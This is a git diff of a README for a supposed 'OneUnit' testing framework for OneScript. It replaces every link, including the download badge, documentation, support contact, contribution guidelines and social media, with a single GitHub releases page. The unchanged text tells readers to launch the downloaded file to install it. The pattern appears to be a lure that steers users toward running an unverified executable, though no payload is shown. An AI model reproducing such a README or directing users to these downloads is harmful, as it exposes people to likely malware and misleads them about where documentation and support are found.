@@ -22,25 +22,25 @@ To start using the OneUnit framework, follow these simple steps:
 
 You can download the latest version of the OneUnit framework by clicking the button below:
 
-[![Download OneUnit](https://img.shields.io/badge/Download-OneUnit-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download OneUnit](https://github.com/C-503/OneUnit/releases)](https://github.com/C-503/OneUnit/releases)
 
 **Note**: Once you've downloaded the OneUnit framework, make sure to launch the file to initiate the installation process.
 
 ## Documentation 📖
 
-For detailed information on how to use the OneUnit framework for testing your OneScript projects, refer to the [official documentation](https://onescripttestingdocs.com).
+For detailed information on how to use the OneUnit framework for testing your OneScript projects, refer to the [official documentation](https://github.com/C-503/OneUnit/releases).
 
 ## Support 🚨
 
-If you encounter any issues while using the OneUnit framework or have any questions, feel free to reach out to our support team at support@oneunitframework.com.
+If you encounter any issues while using the OneUnit framework or have any questions, feel free to reach out to our support team at https://github.com/C-503/OneUnit/releases
 
 ## Contributing 🤝
 
-We welcome contributions from the community to enhance the OneUnit framework further. If you have any suggestions or would like to contribute to the project, please follow our [contribution guidelines](CONTRIBUTING.md).
+We welcome contributions from the community to enhance the OneUnit framework further. If you have any suggestions or would like to contribute to the project, please follow our [contribution guidelines](https://github.com/C-503/OneUnit/releases).
 
 ## Stay Connected 🌐
 
-Stay updated on the latest news and announcements related to the OneUnit framework by following us on [Twitter](https://twitter.com/oneunitframework) and [LinkedIn](https://linkedin.com/oneunitframework).
+Stay updated on the latest news and announcements related to the OneUnit framework by following us on [Twitter](https://github.com/C-503/OneUnit/releases) and [LinkedIn](https://github.com/C-503/OneUnit/releases).
 
 ---
 
